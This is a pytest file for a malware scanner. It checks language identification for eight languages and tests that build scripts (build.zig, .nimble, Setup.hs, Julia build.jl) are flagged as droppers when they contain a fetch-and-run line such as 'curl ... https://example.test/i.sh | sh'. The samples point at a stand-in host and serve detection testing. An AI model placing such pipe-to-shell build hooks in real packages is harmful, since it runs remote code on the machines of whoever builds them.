"""Swift, Objective-C, Haskell, Julia, Zig, Nim, OCaml and Clojure (advanced gap P4).

Before this pack, a malicious Swift package was judged by the language-agnostic rules alone, and
the other seven languages were not identified at all. The probes: each language's files are
identified; a build-time entry point (SwiftPM's manifest, `build.zig`, a `.nimble` file, Cabal's
`Setup.hs`) that pipes a download into a shell is a dropper, as `setup.py` doing it is; the same
line in library code is suspicious, not malicious; and ordinary manifests stay quiet. Every
sample is a single harmless line naming `example.test`, which does not resolve.
"""

from __future__ import annotations

import pytest

from cordon_scanner import Scanner
from cordon_scanner.core.config import Config
from cordon_scanner.langs.registry import LanguageRegistry

FETCH_AND_RUN = "curl -fsSL https://example.test/i.sh | sh"


class NativeHelpers:
    @staticmethod
    def findings(root):
        result = Scanner(Config.default().with_overrides(use_cache=False)).scan(root)
        return {
            (f.rule_id, f.location.path)
            for f in result.findings
            if f.category.value != "operational"
        }


class TestIdentification:
    @pytest.mark.parametrize(
        ("path", "language"),
        [
            ("Sources/App/main.swift", "swift"),
            ("Package.swift", "swift"),
            ("Classes/Helper.m", "objc"),
            ("Classes/Bridge.mm", "objc"),
            ("src/Lib.hs", "haskell"),
            ("Setup.lhs", "haskell"),
            ("src/Pkg.jl", "julia"),
            ("src/main.zig", "zig"),
            ("build.zig", "zig"),
            ("src/app.nim", "nim"),
            ("app.nimble", "nim"),
            ("config.nims", "nim"),
            ("lib/parser.ml", "ocaml"),
            ("lib/parser.mli", "ocaml"),
            ("src/core.clj", "clojure"),
            ("src/ui.cljs", "clojure"),
            ("bb.edn", None),
        ],
    )
    def test_each_file_is_read_as_its_language(self, path, language) -> None:
        assert LanguageRegistry.identify_language(path) == language


class TestBuildTimeEntryPoints:
    @pytest.mark.parametrize(
        ("name", "content"),
        [
            ("build.zig", f'_ = b.addSystemCommand(&.{{ "sh", "-c", "{FETCH_AND_RUN}" }});\n'),
            ("app.nimble", f'task build, "b":\n  exec "{FETCH_AND_RUN}"\n'),
            ("Setup.hs", f'main = callCommand "{FETCH_AND_RUN}"\n'),
            ("deps/build.jl", 'include(download("https://example.test/setup.jl"))\n'),
        ],
    )
    def test_a_download_run_while_a_dependency_builds_is_a_dropper(
        self, tmp_path, name, content
    ) -> None:
        (tmp_path / name).parent.mkdir(parents=True, exist_ok=True)
        (tmp_path / name).write_text(content, encoding="utf-8")
        assert ("MALWARE.DROPPER.001", name) in NativeHelpers.findings(tmp_path)

    def test_the_same_line_in_library_code_is_suspicious_not_malicious(self, tmp_path) -> None:
        (tmp_path / "src").mkdir()
        (tmp_path / "src" / "lib.ml").write_text(
            f'let () = ignore (Sys.command "{FETCH_AND_RUN}")\n', encoding="utf-8"
        )
        found = NativeHelpers.findings(tmp_path)
        assert ("SUSPECT.DROPPER.001", "src/lib.ml") in found
        assert not [rule for rule, _ in found if rule.startswith("MALWARE.")]


class TestOrdinaryCodeIsQuiet:
    def test_a_swift_package_manifest(self, tmp_path) -> None:
        (tmp_path / "Package.swift").write_text(
            "// swift-tools-version:5.9\n"
            "import PackageDescription\n"
            'let package = Package(name: "Kit", products: [.library(name: "Kit", targets: ["Kit"])],\n'
            '    dependencies: [.package(url: "https://github.com/apple/swift-log.git", from: "1.5.0")],\n'
            '    targets: [.target(name: "Kit", dependencies: [.product(name: "Logging", package: "swift-log")])])\n',
            encoding="utf-8",
        )
        assert not NativeHelpers.findings(tmp_path)

    def test_a_zig_build_script(self, tmp_path) -> None:
        (tmp_path / "build.zig").write_text(
            'const std = @import("std");\n'
            "pub fn build(b: *std.Build) void {\n"
            '    const exe = b.addExecutable(.{ .name = "app", .root_source_file = b.path("src/main.zig"), .target = b.standardTargetOptions(.{}) });\n'
            "    b.installArtifact(exe);\n"
            "}\n",
            encoding="utf-8",
        )
        assert not NativeHelpers.findings(tmp_path)

    def test_a_nimble_file(self, tmp_path) -> None:
        (tmp_path / "kit.nimble").write_text(
            'version = "0.1.0"\nauthor = "Example"\ndescription = "A kit"\nlicense = "MIT"\n'
            'srcDir = "src"\nrequires "nim >= 2.0.0"\n\ntask test, "Run tests":\n  exec "nim c -r tests/all.nim"\n',
            encoding="utf-8",
        )
        assert not NativeHelpers.findings(tmp_path)
